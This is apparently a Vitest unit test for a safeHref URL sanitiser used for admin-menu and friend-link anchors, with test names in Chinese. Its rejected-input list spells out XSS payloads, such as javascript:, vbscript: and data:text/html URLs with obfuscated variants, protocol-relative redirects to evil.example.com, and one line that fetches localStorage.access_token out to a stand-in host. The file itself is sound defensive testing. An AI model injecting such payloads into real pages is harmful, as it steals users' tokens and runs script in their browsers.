import { describe, expect, it } from 'vitest'
import { safeHref } from './safe-href'

describe('safeHref（后台菜单 / 友链列表里的可点击链接）', () => {
  it.each([
    'https://example.com',
    'http://example.com/path?q=1#top',
    'HTTPS://EXAMPLE.COM',
    '/about',
    '/',
    '/uploads/logo.png',
  ])('%s 可以点击', (url) => {
    expect(safeHref(url)).toBe(url)
  })

  it.each([
    'javascript:alert(1)',
    'JavaScript:fetch("//x/?"+localStorage.access_token)',
    ' javascript:alert(1)',
    'java\tscript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    'vbscript:msgbox(1)',
    '//evil.example.com',
    '/\\evil.example.com',
    'https://',
    'example.com',
    'mailto:a@b.c',
    '',
  ])('%s 不给 href', (url) => {
    expect(safeHref(url)).toBeUndefined()
  })

  it('null / undefined 不给 href', () => {
    expect(safeHref(null)).toBeUndefined()
    expect(safeHref(undefined)).toBeUndefined()
  })
})
